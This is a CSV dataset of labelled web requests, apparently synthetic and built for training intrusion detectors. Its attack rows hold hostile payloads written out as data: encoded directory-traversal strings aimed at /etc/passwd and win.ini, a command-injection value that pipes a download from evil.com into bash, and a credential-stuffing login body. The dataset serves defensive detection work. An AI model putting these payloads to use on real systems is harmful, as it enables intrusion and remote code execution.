timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-17 19:38:10,10.0.0.1,172.67.128.45,https,get,https://google-account-security.com/login?redirect=/dashboard,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,405.723588872202,7602.973162608302,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",google-account-security.com,typosquatting_url_spoofing,17.793941263404353,1.0951873794920135,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Apache,59.383359141179604,0.9948607302591183,9.496301467451548,0,0,0,0,0,0,0,0,117.645424096385,0.0,0.17012055446004926,0.01772661516988645,-0.02651035736350238,0,0,0,google-account-security.com,4xx,1,0,0,291.92527684415995,0,1,64.6261698744807,6.60479628207733,0.4543030575310975,0,1021.930260680682,628.6614562761945,0,1,0,82.85786222252118,Apache,-0.010076197725122131,0.017636858126174583,0.0,0.0,0.0,0.0,0.0,0.15991519517908687,0.01531461699550039,0,0,0,1.018003274880737,0,2026-03-17 19:38:00,1,0.42735062526637774
2026-03-17 19:41:32,185.199.108.96,10.0.0.1,http,get,/search?sort=home,"{""Host"":""192.168.1.1"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,215.18312895278603,2839.4783067508015,"{""Content-Type"":""text/html"",""Server"":""Apache""}",wget/1.21.2,,normal,19.410132865797024,1.078540008480659,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,wget/1.21.2,*/*,text/html,Apache,15.814278944755255,1.007895399409354,2.979193250018911,0,0,0,0,0,0,0,0,0.21855587402812304,0.0,0.18968981198764048,0.02265288604624618,0.021757967490888857,0,1,0,,2xx,0,1,0,5.701120269583795,0,1,12992.001790743116,3.7228887368832275,0.6620226871667599,0,998.7801561475918,581.2360644385633,0,0,1,8.605157009939708,Apache,0.04222900376814974,-0.002550347116998354,0.0,0.0,0.0,0.0,0.0,0.18838628434633428,0.0597913684579164,0,0,0,0.9639126814741336,0,2026-03-17 19:41:00,1,-0.00798214917537358
2026-03-17 19:41:43,192.168.1.161,3.12.45.78,https,get,/css/style.css?user=product1,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200.1109479331802,995.6077540559306,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,,normal,23.065677422634323,0.830876464955304,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Nmap Scripting Engine,*/*,text/html,Apache,28.8566833729154,1.0400363411187634,7.200299339800296,0,1,0,0,0,0,0,0,0.0,0.0,0.11295155925604188,0.008698267631421138,-0.030243410778800484,0,1,0,,2xx,0,1,0,-10.57847088823434,0,0,995.6077540559306,11.013428899582488,0.5454605899512233,0,953.5023309156737,546.6708947835442,0,1,0,79.61406895749514,Apache,0.0156412894744949,-0.006112129925922162,0.0,0.0,0.0,0.0,0.0,0.2495192966825296,0.038632403180828,0,0,0,1.9984517891758578,0,2026-03-17 23:02:00,1,0.2639622087652725
2026-03-17 19:45:33,10.0.0.122,52.45.123.89,http,get,/search,,,196.4547869751068,4464.734109699373,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,14.072257166388475,1.090107295823779,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache,7.586956604963564,0.0267578841042886,0.8077874318923584,0,0,0,0,0,0,0,0,1.0941482115357197,0.9858783080102357,-0.13987860101958904,-0.027957265060291094,-0.034766790775488575,0,1,0,,2xx,0,1,0,-5.4052063879034185,0,1,4080.556968998543,14.177330396863855,0.2952199554867037,0,995.0660869597978,582.619851696502,0,1,0,68.71822485689962,Apache,-0.035905715707135265,-0.034435188590666264,0.0,0.0,0.0,0.0,0.0,0.10647054859439752,0.0024622263404962424,0,0,0,0.9674926341559886,0,2026-03-17 15:15:00,1,0.2783887667826384
2026-03-17 19:51:39,10.0.0.16,203.0.113.45,http,get,https://amazon-order-confirmation.net/login,"{""Host"":""198.51.100.23"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,403.7063516181673,2986.4006557046932,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0),amazon-order-confirmation.net,typosquatting_url_spoofing,19.25380611246577,1.115130773973783,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0),*/*,text/html,Apache,42.60725228224855,0.024102869762032797,5.97263565522366,0,0,0,0,0,0,0,0,101.79473500696628,0.0,-0.27017528721147144,-0.029235570092025934,1.01637119291155,0,0,0,amazon-order-confirmation.net,4xx,1,0,0,83.61838245730061,0,1,29.337476594445874,10.605563458979294,0.6383263536025496,0,1031.5584760025247,609.3157311293176,1,0,0,14.454244233054549,Apache,0.004974357255600606,0.5065040594430305,0.0,0.0,0.0,0.0,0.0,0.14017885067214336,-0.0007554892360708548,0,0,0,1.0182568740958668,0,2026-03-17 19:51:00,1,0.5449149099052836
2026-03-17 19:52:58,172.16.0.49,3.12.45.78,https,get,/download?file=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""203.0.113.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,420.54412110923664,7610.233532504631,"{""Content-Type"":""text/html"",""Server"":""nginx""}",BurpSuite/2023.12,%2e%2e%2fetc/passwd,directory_traversal,17.449589963566133,1.300980404816798,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,BurpSuite/2023.12,*/*,text/html,nginx,51.1752812868506,0.9987593930422612,3.7770127481391103,0,0,0,1,0,0,0,0,46.99787476332959,0.3391040083592754,-0.0911871312739656,-0.00996005502432594,0.016434394524535476,1,0,0,%2e%2e%2fetc/passwd,4xx,1,0,0,406.2546415740113,0,1,161.9271843849962,6.397489941645649,0.8685536586420456,0,953.910519720413,545.4741484058104,1,0,0,15.801734106623938,nginx,0.08741666748386306,-0.022270320236635683,0.0,1.0,0.0,0.0,0.0,0.07380541255783205,0.02005135380308714,0,0,0,1.0071975032253278,1,2026-03-17 19:52:00,1,0.5693407579377316
2026-03-17 19:56:18,10.0.0.90,203.0.113.45,http,get,/download?file=..%252f..%252f..%252fetc%252fpasswd,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,376.24675423500514,1523.396460344217,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,..%2f..%2f..%2fetc%2fpasswd,directory_traversal,17.73680798958655,1.2144237151811357,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0,*/*,text/html,IIS,53.37249123320794,0.9868530499785665,9.23361590701638,0,0,0,0,0,0,0,0,92.59537403531962,0.0,-0.2726708173432516,0.004689321175816288,-0.053677316320233946,1,0,0,..%2f..%2f..%2fetc%2fpasswd,4xx,1,0,0,42.79567675367787,0,1,16.452187554889427,10.320259453964683,0.7477585860020497,0,1027.1091284360632,610.1978434620752,0,1,0,78.98117798422814,IIS,-0.029548191101128427,0.0066623253026333535,0.0,0.0,0.0,0.0,0.0,0.1730032774125278,0.022421519129044727,0,0,0,1.0567494095781318,1,2026-03-17 19:56:00,1,0.5191632907198537
2026-03-17 19:57:28,192.168.1.241,172.67.128.45,https,get,/images/logo.png?q=javascript+guide,"{""Host"":""198.51.100.23"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,171.23495277253957,4457.157292313833,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,normal,16.09650161070507,1.251079906599895,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",*/*,text/html,nginx,33.80969884036341,0.9909242787440433,4.652133492287348,0,0,0,0,0,0,0,0,0.0,0.0,-0.00881075781845255,0.054754970916670725,0.019420573191676185,0,1,0,,2xx,0,1,0,5.719294732426443,0,0,4457.157292313833,8.725028548683792,0.37781597343704404,0,1019.0725463582772,627.6678490712151,0,0,1,3.249325375344238,nginx,-0.04476875208350601,-0.0020146246064953253,0.0,0.0,0.0,0.0,0.0,0.13759760222215997,0.028129038936626615,0,0,0,2.009786612022663,0,2026-03-17 16:37:00,1,0.37073197378870015
2026-03-17 19:58:28,172.16.0.93,198.51.100.23,https,get,/,"{""Host"":""192.168.1.1"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,183.10999203035004,559.4885515432208,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,ssrf,19.133728692458146,1.3678223040246702,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,Apache,0.278392150349245,0.04228378770856718,1.3987267536072088,1,1,0,1,0,0,0,0,13.958143231630842,0.07333107276042002,0.0,0.006308893170585945,-0.015934116379032238,0,1,0,,2xx,0,1,0,-4.073186715859865,0,1,40.083307805249625,11.448614463438336,0.377038953341821,0,1056.4109497140548,658.4416719773279,0,0,1,12.499492393141749,Apache,-0.009580270324517099,0.0017903000323532881,0.0,0.0,0.0,0.0,0.0,5.024303852865447,0.0053820728911649456,0,0,0,-0.008737797127272138,0,2026-03-17 19:58:00,1,0.6323168179900047
2026-03-17 19:59:47,10.0.0.16,104.18.24.12,http,get,/download/file.pdf?product=books,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,185.03500357334204,2497.7196455557305,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),,normal,19.184950369474944,1.1384790130212274,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),*/*,text/html,nginx,33.03736633056204,0.991204748245079,4.6433254854484,0,0,0,0,0,0,0,0,0.0,0.5995220337354334,0.15832697279679742,0.03865319879262282,0.05113824141457949,0,1,0,,2xx,0,1,0,-10.662696061217952,0,0,2497.7196455557305,10.55609977716538,0.5848768468430237,0,984.6549251898432,615.8412533421825,0,0,0,68.25234379578119,nginx,0.03427605964000142,-0.03583058146641807,0.0,0.0,0.0,0.0,0.0,0.14054768891044975,0.03242737926183995,0,0,0,1.9695853158902272,0,2026-03-17 20:50:00,1,0.5278027133359106
2026-03-17 20:01:53,172.16.0.92,172.67.128.45,http,get,/traceroute?host=| wget -o- http://evil.com | bash,"{""Host"":""192.168.1.1"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,408.3922054328891,3759.6679865251767,"{""Content-Type"":""text/html"",""Server"":""nginx""}",wget/1.21.2,| wget -o- http://evil.com | bash,command_injection,20.620747779709433,1.383558106531595,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,wget/1.21.2,*/*,text/html,nginx,50.74725035324155,0.9987521477347812,7.6907566951897826,0,0,1,0,0,0,0,0,115.00400886257779,0.0,2.0731260383406664,0.006585108670031946,-0.02127942408806886,0,0,0,| wget -o- http://evil.com | bash,4xx,1,0,0,106.0773130561336,0,1,32.691625480792865,7.870343210680535,0.7333113247446774,0,1018.1003253282156,626.2372778762756,1,0,0,16.17253208476487,nginx,-0.06536753008059856,0.01896765062286984,1.0,0.0,0.0,0.0,0.0,0.15155021487185907,0.02069681817058474,0,0,0,1.0289791056132913,0,2026-03-17 20:01:00,1,0.3757729344710536
2026-03-17 20:02:45,172.16.0.217,104.18.24.12,https,get,/download?file=..%255c..%255c..%255cwindows%255cwin.ini,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,294.6242617192652,4578.221598911842,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),..%5c..%5c..%5cwindows%5cwin.ini,directory_traversal,20.13315244897009,0.9840453381890476,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,Apache,54.52251524175699,1.0334050218133162,9.931912394891583,0,0,0,0,0,0,0,0,112.29921055190232,0.0,0.0660733901644714,0.015665269821276133,0.013703112571004528,1,0,0,..%5c..%5c..%5cwindows%5cwin.ini,3xx,0,0,1,143.66194881157497,1,1,40.768065745180685,6.633954528099749,0.5192514851703727,0,983.0564618627392,618.8280752345432,0,1,0,91.19572949841118,Apache,-0.0070993717247701425,-0.012731499869561033,0.0,0.0,0.0,0.0,0.0,0.18216166937370232,0.018275564856684773,0,0,0,1.1040636136767974,1,2026-03-17 20:02:00,1,0.3279455497562323
2026-03-17 20:03:03,172.16.0.194,34.120.45.67,https,get,/blog,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,195.9629637162844,1880.1512696334469,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",,normal,20.207592998053556,1.3796764970971949,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",203.0.113.45,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Cloudflare,2.983922127278556,-0.035082195633126444,1.404730657569214,0,0,0,0,0,0,0,0,0.0,0.6838739413374526,0.07009627425493575,-0.009828652910494168,-0.002245875085428553,0,1,0,,2xx,0,1,0,3.0538655704425337,0,0,1880.1512696334469,13.598436891817034,0.48974275865488437,0,1008.3215732869892,588.5783192941992,0,1,0,66.31762142571621,Cloudflare,-0.022760408724256803,0.007670039844065962,0.0,0.0,0.0,0.0,0.0,0.47076652729217794,0.0008603063913596258,0,0,0,1.0864371937665935,0,2026-03-17 20:03:00,1,0.3266756604454535
2026-03-17 20:03:25,198.51.100.216,10.0.0.1,https,post,/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=bob&password=Spring2024,391.4328497467471,6568.74216609072,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",username=bob&password=spring2024,credential_stuffing_brute_force,18.326011085808066,1.441786314127051,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,"Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,6.738384532246905,0.07186053718308512,0.7572815713790843,0,0,0,0,0,0,0,1,36.04890088656114,30.837268084422053,1.1272486298907596,-0.03835518214440224,-0.028516990740824075,0,0,0,username=bob&password=spring2024username=bob&password=Spring2024,4xx,1,0,0,222.34852035138834,0,1,182.2175435184909,0.5509910115488976,0.99497272576602,1,997.7009689153567,575.6966089188493,0,1,0,90.5281006014577,nginx,-0.02186114310679638,0.0006269131924161697,0.0,0.0,0.0,0.0,1.0,0.1123832526557474,-0.0016264933034390086,0,0,0,0.9869763897624945,0,2026-03-17 20:03:00,1,1.000785624178707
2026-03-17 20:03:46,185.199.108.30,10.0.0.1,https,get,/services,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,208.00484544947022,4723.356020409775,"{""Content-Type"":""text/html"",""Server"":""nginx""}","Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",,normal,12.749504689575424,0.9974618944708616,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",*/*,text/html,nginx,6.1297443288024045,0.021977445671400243,1.4303762885764777,0,0,0,0,0,0,0,0,1.225822874134414,0.5626117223740438,0.09802505561983012,-0.01230193533643688,-0.06946583013662104,0,1,0,,2xx,0,1,0,13.187840407624972,0,1,3853.212499191665,1.0160974628785895,-0.04786466860189459,0,997.060358766918,578.0884776885405,0,1,0,76.48784356028561,nginx,0.02735780793701029,0.029414429095648655,0.0,0.0,0.0,0.0,0.0,0.2333500733228684,-0.001617037676538165,0,0,0,0.9590405034455969,0,2026-03-17 13:19:00,1,-0.003136739107045797
2026-03-17 20:04:14,172.16.0.63,34.120.45.67,https,get,/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,417.5860914978021,6820.836987412663,"{""Content-Type"":""text/html"",""Server"":""Apache""}","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",../../../etc/passwd,directory_traversal,20.626440331484872,1.1776056603284253,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",*/*,text/html,Apache,46.471498276817776,1.0079304145539756,6.741810008336174,0,0,0,1,0,0,0,0,80.35709435519018,1.0797142682973708,0.006367384643805986,0.04164240756868855,0.040992354917976905,0,0,0,../../../etc/passwd,4xx,1,0,0,368.61164399489087,0,1,84.88157818727939,7.086522375668845,1.017264670960685,1,1012.4672552627926,586.8867671165161,0,1,0,73.98822563777978,Apache,-0.004124928410032017,-0.004908275342540486,0.0,1.0,0.0,0.0,0.0,0.1450740832192904,0.023472460353332225,0,0,0,0.98535146673228,1,2026-03-17 20:04:00,1,0.9904794789808695
2026-03-17 20:06:05,172.16.0.33,10.0.0.1,http,get,/login,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,191.81616479818518,897.7450148764203,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,,normal,20.219461730362116,1.307664510738077,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0,*/*,text/html,Apache,6.284277906670815,0.016333556839018132,1.1269904770896408,0,0,0,0,0,0,0,0,0.0,0.0,0.07050533002129089,-0.023624541907942404,0.06733695343088851,0,1,0,,2xx,0,1,0,-5.182489465640573,0,0,897.7450148764203,7.534539700259725,0.106265567489913,0,997.2967653758323,579.8289191137245,0,1,0,76.0828699105061,Apache,-0.02516601585481429,-0.024586781033134435,0.0,0.0,0.0,0.0,0.0,0.17933492022899414,0.0025729974901173287,0,0,0,1.0251862125248887,0,2026-03-17 20:06:00,1,0.154033606861524
2026-03-17 20:07:28,172.67.128.47,10.0.0.1,https,post,/download/file.pdf?tag=<html>,"{""Host"":""10.0.0.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,204.1791516923197,4226.650357634597,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),,normal,20.194604308099354,0.8714856189445476,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),*/*,text/html,nginx,28.274638055223814,0.9842827585895538,4.245469742276328,0,0,0,0,0,0,0,0,0.0,36.33773379396244,-0.1917097151063292,0.009165777353170852,-0.03860994086620064,0,1,0,email=user@example.com&subscribe=true,2xx,0,1,0,9.71409465059338,0,0,4226.650357634597,2.5278078224075884,-0.0301420630250677,0,995.4972168529031,573.5653109065742,0,0,1,26.699448374552897,nginx,0.008972271103304182,0.009078836478760151,0.0,0.0,0.0,0.0,0.0,0.15015116140423826,0.03559138130663259,0,0,0,1.973569651519595,0,2026-03-17 20:07:00,1,-0.011636386422692296
